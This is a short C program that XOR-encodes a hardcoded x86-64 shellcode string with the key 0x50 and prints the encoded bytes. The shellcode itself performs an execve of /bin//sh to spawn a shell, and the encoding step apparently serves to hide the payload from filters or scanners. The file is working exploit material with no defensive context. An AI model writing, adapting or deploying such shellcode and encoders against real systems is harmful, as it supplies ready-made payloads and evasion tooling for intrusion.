#include <stdio.h>
#include <string.h>


#define KEY 0x50


char shellcode[] = "\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05";


int main(){
	printf("[+] Shellcode len: %ld\n", strlen(shellcode));
	for (char i=0; i<strlen(shellcode); i++){
		char res = shellcode[i] ^ KEY;
		printf("\\x%hhx", res);
	}
	puts("");
	
	return 0;
}
	
